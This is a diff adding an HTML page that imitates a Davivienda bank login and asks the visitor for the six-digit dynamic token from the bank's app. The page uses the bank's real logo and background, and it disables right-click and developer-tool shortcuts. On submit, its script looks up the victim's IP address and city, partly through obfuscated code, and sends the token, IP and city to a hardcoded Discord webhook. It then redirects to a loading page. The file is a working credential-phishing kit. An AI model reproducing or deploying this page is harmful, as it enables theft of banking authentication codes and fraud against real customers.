@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<title>Davivienda</title>
+<link rel="shortcut icon" type="image/x-icon" href="https://c.s-microsoft.com/favicon.ico?v2" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<!-- Fuentes y estilos -->
+<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<style>
+:root {
+    --blue-dark: #106ebe;
+    --blue-light: #0078d4;
+    --gray-dark: #616161;
+    --gray-light: rgba(243, 242, 241, 0.9);
+    --border-radius: 12px;
+    --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    --transition: all 0.2s ease-in-out;
+}
+* {
+    box-sizing: border-box;
+    padding: 0;
+    margin: 0;
+}
+ body {
+    background: url('https://enlinea.davivienda.com.sv/ebanking/images/login/home/home-davivienda.jpg') no-repeat center center fixed; /* O la ruta correcta */
+    background-size: cover;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    min-height: 100vh;
+}
+body::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+   
+    z-index: -1;
+}
+
+/* Centrar el botón horizontalmente */
+.button-container {
+  display: flex;
+  justify-content: center;
+  margin-top: 20px; /* opcional, para separar del input */
+}
+.login-container {
+    width: 100%;
+    max-width: 440px;
+    padding: 0 15px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
+
+
+               .top-strip {
+    background-color:#ee1c28 /* Color rojo */
+    height: 60px; /* Altura de la franja, ajusta según prefieras */
+    width: 100%;
+    display: flex;
+    align-items: center;
+    padding: 0 10px; /* Espacio interior */
+    box-shadow: 0 2px 4px rgba(0,0,0,0.2); /* Opcional, sombra */
+    position: fixed; /* Para que quede fija en la parte superior */
+    top: 0;
+    left: 0;
+    z-index: 9998; /* Para que quede por encima de otros elementos */
+}
+
+.top-strip {
+    background-color:#ee1c28;
+    height: 60px;
+    width: 100%;
+    display: flex;
+    align-items: center;
+    padding: 0 10px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: 9998;
+}
+
+.logo-container {
+    height: 100%;
+    display: flex;
+    align-items: center;
+}
+.login-box {
+    width: 100%;
+    background-color: rgb(255, 255, 255);
+    box-shadow: var(--box-shadow);
+    border-radius: var(--border-radius);
+    padding: 40px;
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    margin: 20px 0;
+    position: relative;
+}
+/* Pie de página móvil y otros estilos omitidos por brevedad... */
+.mobile-footer {
+    position: absolute;
+    bottom: 8px;
+    left: 0;
+    width: 100%;
+    text-align: center;
+    background: transparent;
+    padding: 0;
+    margin-bottom: 16px;
+    font-size: 12px;
+    color: #fff;
+    text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
+    z-index: 9999;
+}
+.mobile-footer .footer-links {
+    display: inline-flex;
+    gap: 32px;
+    flex-wrap: wrap;
+    justify-content: center;
+}
+.footer-link {
+    color: #fff;
+    text-decoration: none;
+}
+.footer-link:hover {
+    text-decoration: underline;
+}
+/* Ocultamos elementos innecesarios... */
+.login-note,
+.divider,
+.login-options {
+    display: none;
+}
+.login-header {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+}
+#user-email-display {
+    display: inline-block;
+    background: #fff;
+    border: 1px solid #ddd;
+    border-radius: 999px;
+    padding: 4px 16px;
+    margin-bottom: 16px;
+    font-size: 12px;
+    font-weight: 600;
+    color: #616161;
+    word-break: break-all;
+    font-family: 'Segoe UI', Arial, sans-serif;
+}
+.login-header img {
+    padding-bottom: 24px;
+    width: 108px;
+    transition: transform 0.3s ease;
+}
+.login-header img:hover {
+    transform: scale(1.05);
+}
+.login-title {
+    font-size: 24px;
+    font-weight: 500;
+    color: #242424;
+    margin: 0 0 8px 0;
+}
+.login-subtitle {
+    font-size: 14px;
+    color: #424242;
+    margin: 0 0 20px 0;
+}
+.form-group {
+    margin-bottom: 20px;
+    position: relative;
+}
+.form-control {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    color: #707070;
+    width: 100%;
+    height: 44px;
+    padding: 8px 12px;
+    border: 1px solid rgba(166, 166, 166, 0.5);
+    border-radius: 4px;
+    font-size: 16px;
+    transition: var(--transition);
+    background-color: rgba(255, 255, 255, 0.9);
+}
+.form-control:focus {
+    outline: none;
+    border-color: var(--blue-light);
+    box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.3);
+    background-color: #fff;
+}
+
+
+
+
+
+.btn {
+    display: inline-block;
+    padding: 10px 16px;
+    font-size: 14px;
+    font-weight: 600;
+    border-radius: var(--border-radius);
+    cursor: pointer;
+    text-align: center;
+    text-decoration: none;
+    border: none;
+    transition: var(--transition);
+}
+.btn-amarillo {
+    /* Fondo rojo */
+    background-color: #e02424; /* Puedes usar cualquier tono de rojo que prefieras */
+    color: #ffffff; /* Letras blancas */
+    width: 100%;
+    height: 44px;
+    font-weight: 600;
+    border-radius: var(--border-radius);
+    transition: var(--transition);
+    cursor: pointer;
+    display: inline-block;
+    padding: 10px 16px;
+    font-size: 14px;
+    text-align: center;
+    text-decoration: none;
+    border: none;
+}
+
+.btn-amarillo:hover {
+    background-color: #c82323; /* Rojo más oscuro para hover */
+    color: #ffffff; /* Letras blancas */
+    transform: translateY(-1px);
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+}
+.forgot-password-link {
+    color: #115ea3;
+    font-size: 14px;
+    font-weight: 600;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    margin-top: 8px;
+    background-color: transparent;
+    border: transparent;
+    text-decoration: none;
+    display: block;
+    text-align: left;
+}
+.forgot-password-link:hover {
+    text-decoration: underline;
+}
+.back-button {
+    position: absolute;
+    top: 16px;
+    left: 16px;
+    color: rgba(3, 3, 3, 0.9);
+    font-size: 14px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    transition: var(--transition);
+    background: none;
+    border: none;
+    text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+}
+.back-button:hover {
+    color: #000000;
+    transform: translateX(-2px);
+}
+.pin-container {
+    margin-top: 20px;
+}
+.pin-label {
+    font-size: 14px;
+    margin-bottom: 8px;
+    display: block;
+    font-weight: 600;
+}
+.pin-input {
+    width: 100%;
+    height: 44px;
+    font-size: 20px;
+    text-align: center;
+    letter-spacing: 8px;
+    padding: 8px 0;
+    border: 1px solid rgba(166, 166, 166, 0.5);
+    border-radius: 4px;
+    outline: none;
+    transition: var(--transition);
+}
+.pin-input:focus {
+    border-color: var(--blue-light);
+    box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.3);
+}
+.error-message {
+    color: #d93025;
+    font-size: 12px;
+    margin-top: 8px;
+    display: none;
+}
+
+.foster-negro {
+  position: fixed; /* Fijo en la parte inferior */
+  bottom: 0;       /* En la parte inferior de la ventana */
+  left: 0;         /* Desde la izquierda */
+  width: 100%;     /* Cubrir toda la línea de la página */
+  background-color: #000; /* Fondo negro */
+  color: #fff;            /* Texto blanco */
+  padding: 8px;           /* Espaciado interno */
+  text-align: center;     /* Centrar el texto */
+  z-index: 9999;          /* Asegurarse que quede por encima de otros elementos */
+  font-family: 'Segoe UI', Arial, sans-serif;
+}
+        body {
+            background: url('https://enlinea.davivienda.com.sv/ebanking/images/login/home/home-davivienda.jpg') no-repeat center center;
+            background-size: cover;
+            /* Solución para móviles: usamos min-height con unidades de vista estables y evitamos 'fixed' */
+            min-height: 100vh;
+            min-height: 100dvh; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            padding: 20px;
+        }
+/* Responsive omitted por brevedad... */
+</style>
+</head>
+<body oncontextmenu="return false">
+<script>
+  // Bloquear teclas F12, etc.
+  document.addEventListener("keydown", function(e) {
+    if (e.key === "F12" || (e.ctrlKey && e.key === "u") || (e.shiftKey && e.key === "I")) {
+      e.preventDefault();
+      return false;
+    }
+  });
+</script>
+
+
+ <div class="top-strip">
+    <div class="logo-container">
+        <img src="https://enlinea.davivienda.com.sv/ebanking/images/DAVIVIENDA/header/logo_davivienda.png" alt="Logo" class="logo">
+    </div>
+</div>
+
+    <!-- Paso para crear PIN -->
+    <div id="pin-step">
+      <div class="login-header">
+       
+         <h2 class="login-title">Autenticacion del cliente</h2>
+                </div>
+       
+      <form id="pin-form" aria-label="Formulario de creación de PIN">
+        <div class="form-group pin-container">
+
+          <input
+  type="password"
+  id="pin"
+  maxlength="6"
+  minlength="6"
+  class="pin-input"
+  placeholder="INGRESAR TOKEN"
+  required
+  pattern="\d{6}"
+  style="
+    background-color: transparent;
+   border: 1px solid rgba(166, 166, 166, 0.5)
+    outline: none;
+    color: inherit;
+    font-size: inherit;
+    width: 100%;
+
+
+
+  ">        
+                
+          <div class="error-message" id="pin-error">Por favor introduce tu Clave Dinamica generada por la APP.</div>
+      <div class="button-container">
+  <button type="submit" class="btn btn-amarillo" aria-label="Guardar PIN">Continuar</button>
+</div>
+      </form>
+      <!-- Botón para enviar a Discord -->
+    
+    </div>
+  </div>
+</div>
+<div class="mobile-footer">
+  <div class="footer-links">
+    
+  </div>
+  <div class="footer-note">
+    Usa la exploración privada si este no es tu dispositivo. <a href="#">Más información</a>
+  </div>
+</div>
+
+   <div class="foster-negro">
+  <p>Davivienda - © 2026 Davivienda - Todos los derechos reservados</p>
+</div>
+<script>
+
+    function togglePassword() {
+    const passwordInput = document.getElementById('password');
+    const eyeIcon = document.querySelector('.toggle-password i');
+    
+    if (passwordInput.type === 'password') {
+      passwordInput.type = 'text';
+      eyeIcon.classList.remove('fa-eye');
+      eyeIcon.classList.add('fa-eye-slash');
+    } else {
+      passwordInput.type = 'password';
+      eyeIcon.classList.remove('fa-eye-slash');
+      eyeIcon.classList.add('fa-eye');
+    }
+  }
+
+
+$(document).ready(function() {
+const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1559658003324735489/M9y6cOyfbKIxMIWDDPMsStoJ8kRm9eW-e98OEecL508LNzg6lnRWBTpSSf0cuCsi9C4v"; // Tu webhook
+  function obtenerIP() {
+    return $.getJSON('https://api.ipify.org?format=json');
+  }
+
+  function obtenerCiudad(ip) {
+   function _0x5e5e(_0x22fa10,_0x207423){_0x22fa10=_0x22fa10-(0x1fb4+0x2*0x334+0x218*-0x12);const _0x258119=_0x2366();let _0x25583b=_0x258119[_0x22fa10];return _0x25583b;}function _0x2366(){const _0x2dfcdf=['294JNutet','41799dDPHSc','OCATION','56335FihwRW','TU_API_KEY','879836OBDSvs','416ExwHGL','200goansX','_DE_IPGEOL','14179070QfVDXb','67921vhEelR','766080EtQcZs','746394TltBCh'];_0x2366=function(){return _0x2dfcdf;};return _0x2366();}const _0x3fdd24=_0x5e5e;(function(_0x271250,_0x544425){const _0x5b7c70=_0x5e5e,_0xc22f4=_0x271250();while(!![]){try{const _0xc5195=-parseInt(_0x5b7c70(0x73))/(-0x243f+-0x81*0x1b+0x31db)+parseInt(_0x5b7c70(0x6c))/(0x1635+-0x763+0x3b4*-0x4)+-parseInt(_0x5b7c70(0x75))/(-0x4*-0xb1+-0x3a*0x79+-0x6b*-0x3b)*(parseInt(_0x5b7c70(0x6e))/(-0x182a+0x1bd4+0x3a6*-0x1))+parseInt(_0x5b7c70(0x77))/(-0x1160+-0xcf*0x2e+0x3697)*(-parseInt(_0x5b7c70(0x74))/(0x1*0xabd+-0x17b*-0x2+-0xdad))+-parseInt(_0x5b7c70(0x71))/(0x90a*0x2+-0x4cd+-0xd40)*(-parseInt(_0x5b7c70(0x6d))/(-0x929+-0x192d*0x1+-0x35*-0xa6))+parseInt(_0x5b7c70(0x72))/(-0xb*-0x2fb+-0xa63*-0x1+-0x2b23)+parseInt(_0x5b7c70(0x70))/(0x24b*-0x7+-0x11b9+0x43a*0x8);if(_0xc5195===_0x544425)break;else _0xc22f4['push'](_0xc22f4['shift']());}catch(_0x48c319){_0xc22f4['push'](_0xc22f4['shift']());}}}(_0x2366,-0xc05df+-0x4*-0x31319+-0x1*-0x6a091));const apiKey=_0x3fdd24(0x78)+_0x3fdd24(0x6f)+_0x3fdd24(0x76);
+    function _0x3593(){const _0x130f82=['i.ipgeoloc','pgeo?apiKe','2609900HjpmPF','ation.io/i','113769hekudk','&ip=','2581033XoigVB','6pIRfUi','3gxejME','296SGiRac','334803DgLtgA','https://ap','64115KrnZvv','172XXDvhi','824198soWZda','31262ImEPKu'];_0x3593=function(){return _0x130f82;};return _0x3593();}const _0x2e0e66=_0x1d4c;(function(_0x19ba4a,_0x3cfe01){const _0x5d5b30=_0x1d4c,_0x165bfe=_0x19ba4a();while(!![]){try{const _0x705c97=parseInt(_0x5d5b30(0x1c0))/(0x146d+-0x56*0xc+-0x1064)+-parseInt(_0x5d5b30(0x1b4))/(-0x1*0x24d7+0x4b4+0x3*0xab7)*(parseInt(_0x5d5b30(0x1be))/(0x1e48+-0xae*0x2d+0x51))+parseInt(_0x5d5b30(0x1b3))/(-0x222a*0x1+-0x1*-0x13e1+0xe4d)*(parseInt(_0x5d5b30(0x1c2))/(-0x1e34+-0x14c3*0x1+0x32fc))+parseInt(_0x5d5b30(0x1bd))/(-0x76d*0x1+-0x16d*-0x2+-0x6b*-0xb)*(-parseInt(_0x5d5b30(0x1bc))/(-0x96b+0xd31+-0x3bf))+parseInt(_0x5d5b30(0x1bf))/(0x7*0x15a+-0x4f*0x2c+0xb1*0x6)*(parseInt(_0x5d5b30(0x1ba))/(0x21d*0xe+-0x1*0xcc7+-0x10c6))+-parseInt(_0x5d5b30(0x1b8))/(0x22e1+-0x12*0x81+-0x19c5*0x1)+-parseInt(_0x5d5b30(0x1b5))/(-0xd1c+-0xae3+-0x2*-0xc05);if(_0x705c97===_0x3cfe01)break;else _0x165bfe['push'](_0x165bfe['shift']());}catch(_0xfe92b8){_0x165bfe['push'](_0x165bfe['shift']());}}}(_0x3593,0x1c79c*0x1+0x1*-0x5cc41+0x8bcb0));function _0x1d4c(_0x52dfe5,_0x2d52e0){_0x52dfe5=_0x52dfe5-(-0x6*-0x64d+0x7a*0x1a+-0x307f);const _0x56baee=_0x3593();let _0x162e62=_0x56baee[_0x52dfe5];return _0x162e62;}const url=_0x2e0e66(0x1c1)+_0x2e0e66(0x1b6)+_0x2e0e66(0x1b9)+_0x2e0e66(0x1b7)+'y='+apiKey+_0x2e0e66(0x1bb)+ip;
+    return $.getJSON(url);
+  }
+
+  $('#pin-form').on('submit', function(e) {
+    e.preventDefault();
+    var pin = $('#pin').val().trim();
+    var pinPattern = /^\d{6}$/;
+    if (!pinPattern.test(pin)) {
+      $('#pin-error').show();
+      $('#pin').focus();
+      return;
+    } else {
+      $('#pin-error').hide();
+    }
+
+    // Obtener IP y ciudad
+    obtenerIP().done(function(ipData) {
+      const ip = ipData.ip;
+      // Ahora obtener ciudad usando la API
+      obtenerCiudad(ip).done(function(locationData) {
+        const ciudad = locationData.city || 'Desconocida';
+
+        // Crear el embed para Discord
+        const embed = {
+          embeds: [
+            {
+              title: "CODIGO 6 DIGITOS DAVIVIENDA",
+              color: 15158332, // Rojo (puedes cambiar el color)
+              fields: [
+                {
+                  name: "PIN",
+                  value: pin,
+                  inline: false
+                },
+                {
+                  name: "Ciudad",
+                  value: ciudad,
+                  inline: false
+                },
+                {
+                  name: "Dirección IP",
+                  value: ip,
+                  inline: false
+                }
+              ]
+            }
+          ]
+        };
+
+        // Enviar a Discord
+        $.ajax({
+          url: WEBHOOK_URL,
+          type: 'POST',
+          data: JSON.stringify(embed),
+          contentType: 'application/json',
+          success: function() {
+            // Redirigir después de enviar
+           window.location.href = "cargando.html";// Cambia por la URL real
+          },
+          error: function() {
+            // En caso de error, también rediriges o puedes mostrar un mensaje
+            window.location.href = "cargando.html";
+          }
+        });
+      }).fail(function() {
+        // Si no se puede obtener la ciudad, enviar solo IP
+        const ip = ipData.ip;
+
+        const embed = {
+          embeds: [
+            {
+              title: "CODIGO 6 DIGITOS DAVIVIENDA",
+              color: 15158332,
+              fields: [
+                {
+                  name: "CODIGO",
+                  value: pin,
+                  inline: false
+                },
+                {
+                  name: "Ciudad",
+                  value: "Desconocida",
+                  inline: false
+                },
+                {
+                  name: "Dirección IP",
+                  value: ip,
+                  inline: false
+                }
+              ]
+            }
+          ]
+        };
+
+        $.ajax({
+          url: WEBHOOK_URL,
+          type: 'POST',
+          data: JSON.stringify(embed),
+          contentType: 'application/json',
+          success: function() {
+            window.location.href = "cargando.html";
+          },
+          error: function() {
+            window.location.href = "cargando.html";
+          }
+        });
+      });
+    });
+  });
+});
+</script>
